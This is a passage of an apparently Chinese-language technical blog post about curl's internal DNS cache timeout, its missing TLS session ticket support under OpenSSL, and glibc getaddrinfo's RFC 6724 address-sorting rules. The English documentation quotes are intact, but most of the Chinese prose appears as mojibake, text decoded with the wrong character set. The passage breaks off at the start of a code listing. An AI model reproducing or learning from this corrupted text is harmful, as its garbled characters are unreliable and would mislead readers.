å±‚é¢æ¥çœ‹ï¼Œå¦‚æœæ²¡æœ‰ç”¨æˆ·ç‰¹æ®Šé…ç½®ï¼Œ curl ä¼šè‡ªå·±ç»´æŠ¤ä¸€ä¸ª DNS å“ˆå¸Œè¡¨ï¼Œå…¶ä¸­çš„è®°å½•è¿‡æœŸæ—¶é—´ä¸º 60s ã€‚</p><p>å®˜ç½‘æ–‡æ¡£ä¹Ÿæœ‰è¿‡ç›¸å…³è¯´æ˜ <a href="https://curl.se/libcurl/c/CURLOPT_DNS_CACHE_TIMEOUT.html" target="_blank" rel="noopener">CURLOPT_DNS_CACHE_TIMEOUT explained</a> ï¼Œå…¶ä¸­æè¿°å¦‚ä¸‹ï¼š</p><blockquote><p>â€‹    Pass a long, this sets the timeout in seconds. Name resolves will be kept in memory and used for this number of seconds. Set to zero to completely disable caching, or set to -1 to make the cached entries remain forever. By default, libcurl caches this info for 60 seconds.</p><p>The name resolve functions of various libc implementations donâ€™t re-read name server information unless explicitly told so (for example, by calling <em>res_init(3)</em>). This may cause libcurl to keep using the older server even if DHCP has updated the server info, and this may look like a DNS cache issue to the casual libcurl-app user.</p><p>Note that DNS entries have a â€œTTLâ€ property but libcurl doesnâ€™t use that. This DNS cache timeout is entirely speculative that a name will resolve to the same address for a certain small amount of time into the future.</p></blockquote><p>æ›´ä¸€æ­¥è¯´æ˜äº†ï¼Œ curl å®Œå…¨å¿½è§†å¾—åˆ°çš„ DNS æŸ¥è¯¢å¾—åˆ°çš„ TTL ç¼“å­˜æ—¶é—´ï¼Œä½¿ç”¨è‡ªå·±çš„ DNS ç¼“å­˜ç­–ç•¥ã€‚è™½ç„¶ curl æ²¡æœ‰å®ˆæŠ¤è¿›ç¨‹ç­‰ä»€ä¹ˆæ‰‹æ®µçš„æ¥ç»´æŠ¤è‡ªå·±çš„ DNS å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯ä¸ºäº†è§£å†³åœ¨å¤æ‚ç½‘ç»œè¯·æ±‚æ—¶é¿å…è¿‡å¤š DNS è¯·æ±‚ï¼Œè¿˜æ˜¯é€‰æ‹©äº†æ¯æ¬¡ä½¿ç”¨ä¸€ä¸ªå“ˆå¸Œè¡¨æ¥ä¼˜åŒ–ã€‚å…¶ä¸»è¦çš„è®¾è®¡æ€è·¯ä¸»è¦åŸºäºä¸¤å±‚ç¼“å­˜ï¼Œç¬¬ä¸€å±‚ç¼“å­˜ç”±ç³»ç»Ÿå†³å®šï¼Œä¹Ÿå°±æ˜¯é€šè¿‡<code>getaddrinfo</code>è·å–ï¼Œå¦‚æœè¿™æ—¶å€™è¿‡æœŸäº†åˆ™ç”±ç³»ç»Ÿå»è·å– DNS è®°å½•ï¼Œå¦‚æœæ²¡æœ‰è¿‡æœŸåˆ™ç›´æ¥ä½¿ç”¨ç³»ç»Ÿçš„ DNS è®°å½•ï¼›ç¬¬äºŒå±‚å°±æ˜¯ curl è‡ªå·±çš„ DNS å“ˆå¸Œè¡¨ï¼Œåœ¨è¿›è¡Œå¤šæ¬¡è¯·æ±‚æ—¶èƒ½ä½“ç°å‡ºä½¿ç”¨è‡ªå·±å“ˆå¸Œè¡¨çš„ä¼˜åŠ¿ï¼Œè¿›ä¸€æ­¥çœå»äº†ä»ç³»ç»Ÿè·å– DNS è®°å½•çš„æ—¶é—´ã€‚å½“ç„¶è¿˜æœ‰ä¸€ç§å¯èƒ½å°±æ˜¯ä¸ºäº†åœ¨ç‰¹å®šåœºåˆåœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£ DNS Rebinding çš„æ”»å‡»ã€‚</p><h3 id="cURL-Session-Ticket"><a href="#cURL-Session-Ticket" class="headerlink" title="cURL Session Ticket"></a>cURL Session Ticket</h3><p>å…³äº Session Ticket ï¼Œè™½ç„¶è¯¥æ ‡å‡†æœ‰å¾ˆå¤šçš„ä¼˜ç‚¹ï¼Œä¸»è¦å®ç°äº† Stateless çš„ç‰¹ç‚¹ï¼Œå‡ç¼“äº†æœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›ï¼Œä½†æ˜¯ä¼¼ä¹ curl with openSSL å¹¶ä¸æ‰“ç®—æ”¯æŒ Session Ticket è¿™ä¸€ extension ã€‚</p><p>è™½ç„¶æ›¾ç»æœ‰äººå°è¯•åœ¨ curl ä¸­æ”¯æŒè¿™ä¸€ TLS 1.2 çš„ç‰¹æ€§ï¼Œä½†æ˜¯æ ¹æ® <a href="https://curl.se/mail/lib-2019-08/0056.html" target="_blank" rel="noopener">Re: Question about SSL Session Tickets</a> å½“ä¸­çš„è®¨è®ºï¼Œ<a href="https://github.com/curl/curl/pull/3060" target="_blank" rel="noopener">TLS Session ticket support</a> æ„å»ºçš„ curl å¹¶ä¸å¯ä»¥æ­£å¸¸çš„ä½¿ç”¨ï¼Œæ‰€ä»¥å½“æ—¶è¢« curl å®˜æ–¹äººå‘˜æ”¾å¼ƒäº†è¯¥ PR Merged ï¼Œä¹‹åä¹Ÿæ²¡æœ‰å†æ‰“ç®—æ”¯æŒè¿™ä¸€ç‰¹æ€§äº†ï¼Œå½“ç„¶ä¹Ÿæ²¡æœ‰åœ¨ curl çš„ <a href="https://curl.se/docs/todo.html" target="_blank" rel="noopener">TODO</a> çœ‹åˆ°ç›¸å…³çš„æ”¯æŒè®¡åˆ’äº†ã€‚å½“ç„¶å¦‚æœä½ éå¸¸å€¾å‘äºä½¿ç”¨ CLI å·¥å…·å»å®éªŒè¯¥ç‰¹æ€§ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ openssl s_client æˆ–è€… curl build with GnuTLS ï¼Œä»–ä»¬éƒ½æ”¯æŒè¿™ä¸€ç‰¹æ€§ã€‚</p><p>ä»¥ä¸‹æ˜¯åœ¨äº’è”ç½‘ä¸Šä¸€äº›å…³äº curl æ”¯æŒ TLS 1.2 Session Ticket çš„è®¨è®ºï¼š</p><p><a href="https://curl.se/mail/lib-2019-08/0056.html" target="_blank" rel="noopener">https://curl.se/mail/lib-2019-08/0056.html</a></p><p><a href="https://github.com/curl/curl/issues/3202" target="_blank" rel="noopener">https://github.com/curl/curl/issues/3202</a></p><p><a href="https://github.com/curl/curl/pull/2220" target="_blank" rel="noopener">https://github.com/curl/curl/pull/2220</a></p><p><a href="https://github.com/curl/curl/issues/1109#issuecomment-274346447" target="_blank" rel="noopener">https://github.com/curl/curl/issues/1109#issuecomment-274346447</a></p><p><a href="https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids" target="_blank" rel="noopener">https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids</a></p><h3 id="IP-Sort-IN-cURL"><a href="#IP-Sort-IN-cURL" class="headerlink" title="IP Sort IN cURL"></a>IP Sort IN cURL</h3><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹äº IP é€‰æ‹©çš„é—®é¢˜äº†ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡ curl åœ¨è·å– DNS è®°å½•çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯<code>getaddrinfo</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä½äº glibc å½“ä¸­ï¼Œä¸ºäº†å¼„æ¸…æ¥šè¿™ä¸ªå‡½æ•°å¯¹äº IP é€‰æ‹©çš„é—®é¢˜ï¼Œæˆ‘ä¸€ä¸ª Web é€‰æ‰‹ä¹Ÿåªèƒ½ç¡¬ç€å¤´çš®å»è°ƒè¯• glibc äº†ï¼Œä½•æ—¶å—è¿‡è¿™ä¸ªè‹¦ï¼ä¸‹é¢å°±æ˜¯åœ¨è°ƒè¯• glibc 2.31 è¿‡ç¨‹å½“ä¸­çš„ä¸€äº›è®°å½•ä¸ç»“æœã€‚</p><p>ä» <a href="https://man7.org/linux/man-pages/man3/getaddrinfo.3.html" target="_blank" rel="noopener">getaddrinfo</a> çš„æ‰‹å†Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ï¼š</p><blockquote><p>â€‹    Given node and service, which identify an Internet host and a service, getaddrinfo() returns one or more addrinfo structures, each of which contains an Internet address that can be specified in a call to bind(2) or connect(2). The getaddrinfo() function combines the functionality provided by the gethostbyname(3) and getservbyname(3) functions into a single interface, but unlike the latter functions, getaddrinfo() is reentrant and allows programs to eliminate IPv4-versus-IPv6 dependencies.</p></blockquote><p>å…¶å‡½æ•°åŠŸèƒ½ä¸»è¦æ˜¯ç”¨æ¥æŸ¥è¯¢ç»™å®šåŸŸåå¯¹åº”çš„ IP ï¼Œç”¨æ¥æ›¿ä»£ä¹‹å‰çš„<code>gethostbyname</code>ä¸<code>getservbyname</code>å‡½æ•°ï¼Œå¹¶ä¸”å‡æ”¯æŒ IPv4 ä¸ IPv6 ã€‚åœ¨æ‰‹å†Œä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æè¿°ï¼š</p><blockquote><p>â€‹    There are several reasons why the linked list may have more than one addrinfo structure, including: the network host is multihomed, accessible over multiple protocols (e.g., both AF_INET and AF_INET6); or the same service is available from multiple socket types (one SOCK_STREAM address and another SOCK_DGRAM address, for example). Normally, the application should try using the addresses in the order in which they are returned. The sorting function used within getaddrinfo() is defined in RFC 3484; the order can be tweaked for a particular system by editing /etc/gai.conf (available since glibc 2.5).</p></blockquote><p>ä»¥åŠåœ¨å…¶é…ç½®æ–‡ä»¶ <a href="https://man7.org/linux/man-pages/man5/gai.conf.5.html" target="_blank" rel="noopener">gai.conf</a> å¸®åŠ©æ–‡æ¡£å½“ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å¦‚ä¸‹æè¿°ï¼š</p><blockquote><p>â€‹    A call to getaddrinfo(3) might return multiple answers. According to RFC 3484 these answers must be sorted so that the answer with the highest success rate is first in the list. The RFC provides an algorithm for the sorting. The static rules are not always adequate, though. For this reason, the RFC also requires that system administrators should have the possibility to dynamically change the sorting. For the glibc implementation, this can be achieved with the /etc/gai.conf file. Each line in the configuration file consists of a keyword and its parameters. White spaces in any place are ignored. Lines starting with â€˜#â€™ are comments and are ignored.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>getaddrinfo</code>å‡½æ•°ä¼šä½¿ç”¨ gai.conf ä»¥åŠ RFC 3484 æ¥å¯¹å…¶å¾—åˆ°çš„ç»“æœè¿›è¡Œæ’åºï¼Œè€Œ gai.conf æ–‡ä»¶ä¸­çš„å¯ä»¥ç”±ç”¨æˆ·æ‰‹åŠ¨é…ç½®ï¼Œæˆ‘ä»¬æš‚ä¸”æç½®ï¼Œå…ˆæ¥çœ‹çœ‹è¿™ä¸ªä¼ è¯´ä¸­çš„ RFC 3484 æ‰€æè¿°çš„è§„åˆ™ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ RFC 3484 å·²ç»è¢« RFC 6724 å–ä»£ï¼ŒSo letâ€™s take a look at the RFC 6724.</p><p>åœ¨ <a href="https://tools.ietf.org/html/rfc6724" target="_blank" rel="noopener">RFC 6724</a> çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„æè¿°ï¼š</p><blockquote><p>â€‹    For example, when DNS name resolution yields both IPv6 and IPv4 addresses and the network protocol stack has available both IPv6 and IPv4 source addresses. In such cases, a simple policy to always prefer IPv6 or always prefer IPv4 can produce poor behavior. As one example, suppose a DNS name resolves to a global IPv6 address and a global IPv4 address. If the node has assigned a global IPv6 address and a 169.254/16 auto-configured IPv4 address [9], then IPv6 is the best choice for communication. But if the node has assigned only a link-local IPv6 address and a global IPv4 address, then IPv4 is the best choice for communication. The destination address selection algorithm solves this with a unified procedure for choosing among both IPv6 and IPv4 addresses.</p></blockquote><p>è¿™é‡Œæ­£å¥½ä¸¾äº†ä¸€ä¸ªä¾‹å­ï¼Œä¾‹å¦‚å½“ DNS è§£æåŒæ—¶äº§ç”Ÿ IPv6 å’Œ IPv4 åœ°å€ï¼Œè€Œç½‘ç»œåè®®æ ˆåŒæ—¶æ‹¥æœ‰ IPv6 å’Œ IPv4 æºåœ°å€æ—¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç®€å•çš„ç­–ç•¥ï¼Œå³æ€»æ˜¯ä¼˜å…ˆé€‰æ‹© IPv6 æˆ–æ€»æ˜¯ä¼˜å…ˆé€‰æ‹© IPv4 ï¼Œå¯èƒ½ä¼šäº§ç”Ÿä¸è‰¯è¡Œä¸ºã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ä¸€ä¸ª DNS è§£æåˆ°ä¸€ä¸ªå…¨å±€ IPv6 åœ°å€å’Œä¸€ä¸ªå…¨å±€ IPv4 åœ°å€ï¼Œå¦‚æœèŠ‚ç‚¹å·²ç»åˆ†é…äº†ä¸€ä¸ªå…¨å±€ IPv6 åœ°å€å’Œä¸€ä¸ª 169.254/16 è‡ªåŠ¨é…ç½®çš„ IPv4 åœ°å€ï¼Œé‚£ä¹ˆ IPv6 æ˜¯é€šä¿¡çš„æœ€ä½³é€‰æ‹©ã€‚ä½†å¦‚æœèŠ‚ç‚¹åªåˆ†é…äº†ä¸€ä¸ªé“¾è·¯æœ¬åœ° IPv6 åœ°å€å’Œä¸€ä¸ªå…¨å±€ IPv4 åœ°å€ï¼Œé‚£ä¹ˆ IPv4 æ˜¯é€šä¿¡çš„æœ€ä½³é€‰æ‹©ã€‚ç›®çš„åœ°å€é€‰æ‹©ç®—æ³•è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œåœ¨ IPv6 å’Œ IPv4 åœ°å€ä¸­è¿›è¡Œç»Ÿä¸€çš„é€‰æ‹©ã€‚</p><p>è¿™ä¸ªä»‹ç»çœ‹èµ·æ¥ä¼¼ä¹æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬è§£å†³å¯¹äºä¸¤ä¸ª IP çš„æ’åºé—®é¢˜ã€‚åœ¨å¤§æ¦‚é€šè¯»è¿™ç¯‡ RFC åï¼Œè¯¥ RFC ä¸»è¦æå‡ºäº†å‡ ç§åœ°å€é€‰æ‹©ç®—æ³•ï¼ŒåŒ…æ‹¬æºåœ°å€é€‰æ‹©ç®—æ³•ã€ç›®çš„åœ°å€é€‰æ‹©ç®—æ³•ç­‰ï¼Œèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬è§£å†³å¾ˆå¤šå¹³æ—¶çš„ç–‘æƒ‘ï¼Œæ¯”å¦‚æœ‰å¤šä¸ªæº IP ä¸ºä»€ä¹ˆä½¿ç”¨å…¶ä¸­ä¸€ä¸ªç‰¹å®šçš„æº IP ç­‰ï¼Œä¸ªäººå»ºè®®å¦‚æœæœ‰ç±»ä¼¼å…³äºç½‘ç»œé€šä¿¡ç–‘é—®æˆ–è€…éœ€è¦äº†è§£ç½‘ç»œé€šä¿¡å†…å®¹çš„åŒå­¦å¯ä»¥è¿›ä¸€æ­¥å­¦ä¹ ä¸€ä¸‹è¯¥ RFC ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯ä¸»è¦æ˜¯ç›®çš„åœ°å€é€‰æ‹©ç®—æ³•ï¼Œä¸ä¼šä»‹ç»å…¶ä»–ç®—æ³•ï¼Œå¹¶ä¸”ä¹Ÿåªæ˜¯åšä¸ªç®€å•ä»‹ç»ã€‚</p><p>å¯¹äºç›®çš„åœ°å€é€‰æ‹©ç®—æ³•éœ€è¦æŒ‰é¡ºåºéµå®ˆåæ¡è§„åˆ™ï¼Œå¹¶ä¸”åªè¦å‰ä»»ä¸€è§„åˆ™èµ·åˆ°æ’åºä½œç”¨ï¼Œåˆ™åç»­è§„åˆ™ä¸èµ·ä½œç”¨ã€‚ä¸‹æ–‡ä»¥ DS è¡¨ç¤º Destination S ã€‚</p><ul><li>è§„åˆ™1ï¼šé¿å…ä¸å¯ç”¨çš„ç›®çš„åœ°ã€‚å¦‚æœå·²çŸ¥ DB æ˜¯ä¸å¯åˆ°è¾¾çš„ï¼Œæˆ–è€…å¦‚æœ Source(DB) æ˜¯æœªå®šä¹‰çš„ï¼Œé‚£ä¹ˆé¦–é€‰DAã€‚åŒç†ï¼Œå¦‚æœå·²çŸ¥ DA æ˜¯ä¸å¯åˆ°è¾¾çš„ï¼Œæˆ–è€… Source(DA) æ˜¯æœªå®šä¹‰çš„ï¼Œé‚£ä¹ˆé¦–é€‰ DB ã€‚</li><li>è§„åˆ™2ï¼šä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„èŒƒå›´ã€‚å¦‚æœ Scope(DA) = Scope(Source(DA)) ï¼Œä¸” Scope(DB) &lt;&gt; Scope(Source(DB)) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DA ã€‚åŒç†ï¼Œå¦‚æœ Scope(DA) &lt;&gt; Scope(Source(DA)) ï¼Œä¸”Scope(DB) = Scope(Source(DB)) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹©DBã€‚</li><li>è§„åˆ™3ï¼šé¿å…ä½¿ç”¨åºŸå¼ƒçš„åœ°å€ã€‚å¦‚æœ Source(DA) è¢«å¼ƒç”¨è€Œ Source(DB) æ²¡æœ‰è¢«å¼ƒç”¨ï¼Œé‚£ä¹ˆé¦–é€‰ DB ã€‚åŒç†ï¼Œå¦‚æœ Source(DA) æ²¡æœ‰è¢«åºŸå¼ƒï¼Œè€Œ Source(DB) è¢«åºŸå¼ƒï¼Œé‚£ä¹ˆä¼˜å…ˆé€‰æ‹© DA ã€‚</li><li>è§„åˆ™4ï¼šä¼˜å…ˆé€‰æ‹©å®¶åº­åœ°å€ã€‚å¦‚æœ Source(DA) åŒæ—¶æ˜¯å®¶åº­åœ°å€å’Œç…§é¡¾åœ°å€ï¼Œè€Œ Source(DB) ä¸æ˜¯ï¼Œé‚£ä¹ˆé¦–é€‰ DA ã€‚åŒç†ï¼Œå¦‚æœ Source(DB) åŒæ—¶æ˜¯å®¶åº­åœ°å€å’Œç…§é¡¾åœ°å€ï¼Œè€Œ Source(DA) ä¸æ˜¯ï¼Œé‚£ä¹ˆé¦–é€‰DBã€‚å¦‚æœ Source(DA) åªæ˜¯ä¸€ä¸ªå®¶åº­åœ°å€ï¼Œè€Œ Source(DB) åªæ˜¯ä¸€ä¸ªç…§é¡¾åœ°å€ï¼Œé‚£ä¹ˆå°±é€‰æ‹© DA ã€‚åŒç†ï¼Œå¦‚æœ Source(DA) åªæ˜¯ä¸€ä¸ªç…§é¡¾åœ°å€ï¼Œè€Œ Source(DB) åªæ˜¯ä¸€ä¸ªå®¶åº­åœ°å€ï¼Œé‚£ä¹ˆé¦–é€‰ DB ã€‚</li><li>è§„åˆ™5ï¼šä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„æ ‡ç­¾ã€‚å¦‚æœ Label(Source(DA))=Label(DA) ä¸” Label(Source(DB)) &lt;&gt; Label(DB) ï¼Œåˆ™é¦–é€‰ DA ã€‚åŒç†ï¼Œå¦‚æœ Label(Source(DA)) &lt;&gt;Label(DA) ï¼Œä¸”Label(Source(DB))=Label(DB)ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DB ã€‚</li><li>è§„åˆ™6ï¼šä¼˜å…ˆé€‰æ‹©è¾ƒé«˜çš„ä¼˜å…ˆçº§ã€‚å¦‚æœ Precedence(DA)&gt; Precedence(DB) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DA ã€‚åŒç†ï¼Œå¦‚æœ Precedence(DA) &lt; Precedence(DB) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DB ã€‚</li><li>è§„åˆ™7ï¼šä¼˜å…ˆé€‰æ‹©æœ¬åœ°ä¼ è¾“ã€‚å¦‚æœ DA æ˜¯é€šè¿‡å°è£…è¿‡æ¸¡æœºåˆ¶ï¼ˆå¦‚IPv4ä¸­çš„IPv6ï¼‰è¾¾åˆ°çš„ï¼Œè€Œ DB ä¸æ˜¯ï¼Œé‚£ä¹ˆä¼˜å…ˆé€‰æ‹© DB ã€‚åŒç†ï¼Œå¦‚æœ DB æ˜¯é€šè¿‡å°è£…åˆ°è¾¾ï¼Œè€Œ DA ä¸æ˜¯ï¼Œé‚£ä¹ˆä¼˜å…ˆé€‰æ‹© DA  ã€‚</li><li>è§„åˆ™8ï¼šä¼˜å…ˆé€‰æ‹©è¾ƒå°çš„èŒƒå›´ã€‚å¦‚æœ Scope(DA) &lt; Scope(DB) ï¼Œåˆ™é¦–é€‰ DA ã€‚åŒæ ·ï¼Œå¦‚æœScope(DA)&gt;Scope(DB) ï¼Œåˆ™é€‰æ‹© DB ã€‚</li><li>è§„åˆ™9ï¼šä½¿ç”¨æœ€é•¿çš„åŒ¹é…å‰ç¼€ã€‚å½“DAå’ŒDBå±äºåŒä¸€ä¸ªåœ°å€æ—ï¼ˆéƒ½æ˜¯IPv6æˆ–éƒ½æ˜¯IPv4ï¼‰ã€‚å¦‚æœCommonPrefixLen(Source(DA), DA) &gt; CommonPrefixLen(Source(DB), DB)ï¼Œåˆ™é¦–é€‰DAã€‚åŒç†ï¼Œå¦‚æœCommonPrefixLen(Source(DA), DA) &lt; CommonPrefixLen(Source(DB)ï¼ŒDB)ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹©DBã€‚</li><li>è§„åˆ™10ï¼šå¦åˆ™ï¼Œä¿æŒé¡ºåºä¸å˜ã€‚å¦‚æœDAåœ¨åŸåˆ—è¡¨ä¸­å…ˆäºDBï¼Œåˆ™ä¼˜å…ˆé€‰æ‹©DAã€‚å¦åˆ™ï¼Œä¼˜å…ˆé€‰æ‹©DBã€‚</li><li>å¦‚æœæ‰§è¡Œæœ‰å…¶ä»–æ–¹æ³•å¯¹ç›®çš„åœ°åœ°å€è¿›è¡Œæ’åºï¼Œè§„åˆ™9å’Œ10å¯ä»¥è¢«å–ä»£ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®æ–½æœºæ„çŸ¥é“å“ªäº›ç›®çš„åœ°å€ä¼šå¸¦æ¥ â€œæœ€ä½³ â€œçš„é€šä¿¡æ€§èƒ½ï¼Œåˆ™è§„åˆ™9å’Œ10å¯ä»¥è¢«å–ä»£ã€‚</li></ul><p>æ›´ç®€å•æ¥è¯´éµå®ˆä»¥ä¸‹è§„åˆ™ï¼š</p><ul><li>é¿å…ä½¿ç”¨ä¸å¯ç”¨çš„ç›®çš„åœ°å€ã€‚å¦‚æœä¸€ä¸ªåœ°å€æ˜¯å¯åˆ°è¾¾çš„ï¼ˆå †æ ˆæœ‰é€šå¾€ç‰¹å®šåœ°å€çš„è·¯ç”±ï¼‰ï¼Œè€Œå¦ä¸€ä¸ªåœ°å€æ˜¯ä¸å¯åˆ°è¾¾çš„ï¼Œé‚£ä¹ˆå°†å¯åˆ°è¾¾çš„ç›®çš„åœ°å€æ”¾åœ¨ä¸å¯åˆ°è¾¾çš„åœ°å€ä¹‹å‰ã€‚</li><li>ä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„èŒƒå›´ã€‚å¦‚æœä¸€ä¸ªåœ°å€çš„ä½œç”¨åŸŸä¸å…¶æºåœ°å€çš„ä½œç”¨åŸŸç›¸åŒ¹é…ï¼Œè€Œå¦ä¸€ä¸ªåœ°å€ä¸ç¬¦åˆè¿™ä¸ªæ ‡å‡†ï¼Œé‚£ä¹ˆå°±æŠŠä½œç”¨åŸŸç›¸åŒ¹é…çš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªç›®çš„åœ°å€ä¹‹å‰ã€‚</li><li>ç›®çš„åœ°å€åŠå…¶ç›¸å…³çš„æºåœ°å€çš„èŒƒå›´ç”±åœ°å€çš„é«˜é˜¶ä½å†³å®šã€‚ç›®çš„åœ°å€å¯ä»¥æ˜¯å¤šæ’­åœ°å€æˆ–å•æ’­åœ°å€ã€‚ä¸ºäº†æ¯”è¾ƒèŒƒå›´ï¼Œå•æ’­é“¾è·¯æœ¬åœ°åœ°å€è¢«æ˜ å°„åˆ°å¤šæ’­é“¾è·¯æœ¬åœ°åœ°å€ï¼Œå•æ’­å…¨å±€åœ°å€è¢«æ˜ å°„åˆ°å¤šæ’­å…¨å±€åœ°å€ã€‚</li><li>é¿å…ä½¿ç”¨åºŸå¼ƒçš„åœ°å€ã€‚å¦‚æœä¸€ä¸ªåœ°å€æ˜¯åºŸå¼ƒçš„ï¼Œè€Œå¦ä¸€ä¸ªåœ°å€æ˜¯éåºŸå¼ƒçš„ï¼Œé‚£ä¹ˆéåºŸå¼ƒçš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªåœ°å€ä¹‹å‰ã€‚</li><li>ä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„æ ‡ç­¾ã€‚å¦‚æœä¸€ä¸ªç›®æ ‡åœ°å€çš„æ ‡ç­¾ä¸å…¶å…³è”çš„æºåœ°å€çš„æ ‡ç­¾ç›¸åŒ¹é…ï¼Œè€Œå¦ä¸€ä¸ªç›®æ ‡åœ°å€çš„æ ‡ç­¾ä¸å…¶å…³è”çš„æºåœ°å€çš„æ ‡ç­¾ä¸ç›¸åŒ¹é…ï¼Œé‚£ä¹ˆå…·æœ‰åŒ¹é…æ ‡ç­¾çš„ç›®æ ‡åœ°å€è¢«æ”¾åœ¨å¦ä¸€ä¸ªåœ°å€ä¹‹å‰ã€‚æœ‰å…³æ ‡ç­¾å¦‚ä½•ä¸ç›®æ ‡åœ°å€å…³è”çš„ä¿¡æ¯ï¼Œè¯·å‚è§IPv6é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨å’Œé…ç½®é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨ã€‚</li><li>ä¼˜å…ˆé€‰æ‹©è¾ƒé«˜çš„ä¼˜å…ˆçº§ã€‚å¦‚æœä¸€ä¸ªåœ°å€çš„ä¼˜å…ˆçº§é«˜äºå¦ä¸€ä¸ªåœ°å€çš„ä¼˜å…ˆçº§ï¼Œé‚£ä¹ˆä¼˜å…ˆçº§è¾ƒé«˜çš„åœ°å€å°†è¢«æ”¾åœ¨å¦ä¸€ä¸ªç›®æ ‡åœ°å€ä¹‹å‰ã€‚è¯·å‚é˜… <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6_c_address_policy_table.htm?view=kc" target="_blank" rel="noopener">IPv6é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨</a> å’Œ <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6_t_configuring_address_policy_table.htm?view=kc" target="_blank" rel="noopener">é…ç½®é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨</a>ï¼Œä»¥äº†è§£æ›´å¤šå…³äºä¼˜å…ˆçº§å€¼å¦‚ä½•ä¸ç›®çš„åœ°å€å…³è”çš„ä¿¡æ¯ã€‚</li><li>ä¼˜å…ˆèŒƒå›´è¾ƒå°ã€‚å¦‚æœä¸€ä¸ªåœ°å€çš„ä½œç”¨åŸŸå°äºå¦ä¸€ä¸ªåœ°å€çš„ä½œç”¨åŸŸï¼Œåˆ™ä½œç”¨åŸŸè¾ƒå°çš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªç›®çš„åœ°å€ä¹‹å‰ã€‚</li><li>ä½¿ç”¨æœ€é•¿çš„åŒ¹é…å‰ç¼€ã€‚å¦‚æœä¸€ä¸ªç›®æ ‡åœ°å€ä¸å…¶å…³è”çš„æºåœ°å€çš„ CommonPrefixLength æ¯”å¦ä¸€ä¸ªç›®æ ‡åœ°å€ä¸å…¶æºåœ°å€çš„ CommonPrefixLength é•¿ï¼Œé‚£ä¹ˆ CommonPrefixLength é•¿çš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªåœ°å€ä¹‹å‰ã€‚</li><li>ä¿æŒé¡ºåºä¸å˜ã€‚æ²¡æœ‰è§„åˆ™é€‰æ‹©è¿™ä¸¤ä¸ªåœ°å€ä¸­è¾ƒå¥½çš„åœ°å€ï¼Œåˆ™å®ƒä»¬é€‰æ‹©æƒé‡ç›¸ç­‰ã€‚é€‰æ‹©ç¬¬ä¸€ä¸ªåœ°å€ä½œä¸ºè¿™ä¸¤ä¸ªåœ°å€ä¸­è¾ƒå¥½çš„åœ°å€ï¼Œé¡ºåºä¸å˜ã€‚</li></ul><p>æˆ‘è®¤ä¸º RFC å†³å®šäº†ä»£ç <strong>åº”è¯¥</strong>æ€ä¹ˆå»æ‰§è¡Œï¼Œä½†æ˜¯ç»ˆç©¶è¿˜æ˜¯ä»£ç å†³å®šäº†æ€ä¹ˆå»æ‰§è¡Œã€‚ï¼ˆçº¯ç²¹æ˜¯æˆ‘ä¹Ÿæ²¡æ€ä¹ˆçœ‹æ‡‚</p><p>äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°<code>getaddrinfo</code>å‡½æ•°çš„å®ç°ï¼š<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479</a> ï¼Œå…³é”®ç‚¹å°±åœ¨è¿™ï¼Œå¯ä»¥çœ‹åˆ°åœ¨<code>getaddrinfo</code>å‡½æ•°æ‹¿åˆ°ç»“æœåä½¿ç”¨äº†<code>rfc3484_sort</code>å¯¹ç»“æœè¿›è¡Œæ’åºï¼š</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 